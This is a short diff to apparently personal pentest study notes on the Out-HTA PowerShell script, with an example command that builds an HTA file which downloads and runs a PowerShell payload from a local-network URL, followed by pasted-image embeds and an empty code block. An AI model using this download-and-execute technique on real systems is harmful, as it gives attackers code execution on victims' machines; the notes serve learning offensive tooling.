@@ -95,3 +95,12 @@ less ./Client/Out-HTA.ps1
 .EXAMPLE
 PS > Out-HTA -PayloadURL http://192.168.254.1/Get-Information.ps1
 ```
+
+Will load the PowerShell and execute the Command
+![[Pasted image 20240509150308.png]]
+
+
+```
+
+```
+![[Pasted image 20240509150921.png]]
